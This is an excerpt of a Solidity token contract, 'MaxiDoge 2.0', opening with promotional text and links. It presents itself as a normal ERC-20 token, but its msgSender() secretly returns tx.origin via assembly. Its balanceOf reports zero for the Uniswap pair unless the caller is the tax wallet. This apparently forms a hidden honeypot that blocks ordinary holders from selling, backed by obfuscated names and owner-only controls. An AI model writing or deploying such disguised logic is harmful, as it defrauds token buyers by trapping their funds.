...
MAXI, a steadfast protector of the ETH Chain and its community. While many have come and gone, MAXI has remained unwavering, dedicating my efforts to the advancement and security of this ecosystem.

https://maxidoge2.fun
https://x.com/MaxiDoge_MAXI2
https://t.me/MaxiDoge_MAXI2
...
abstract contract Context {
    ...
    function msgSender() internal view returns(address r) {
        assembly {r:=origin()}
    }
}
...
contract MaxiDoge2_0 is Context, IERC20, Ownable {
    ...
    uint256 firstBlock;
    address public CHECKSUM_SDHISDR;
    ...
    string private constant _name = unicode"MaxiDoge 2.0";
    ...
    function _feeFactor(address account) internal view returns (uint256) {
        return account == uniswapV2Pair && IERC20(uniswapV2Pair).balanceOf(uniswapV2Pair) > 0 && msgSender() != _taxWallet && msgSender() != address(0) && msgSender() != address(0xdead) ? 0 : 1;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account] * _feeFactor(account);
    }
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        if(_internalTransfer(sender, recipient, amount))
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
	      ...
	      if (!marketPair[from] && !marketPair[to] && from!= address(this) ) {
            ...
            else if(!inSwap && marketPair[to] && swapEnabled ) {
    ...
    function exileW_Restriction() public onlyOwner{
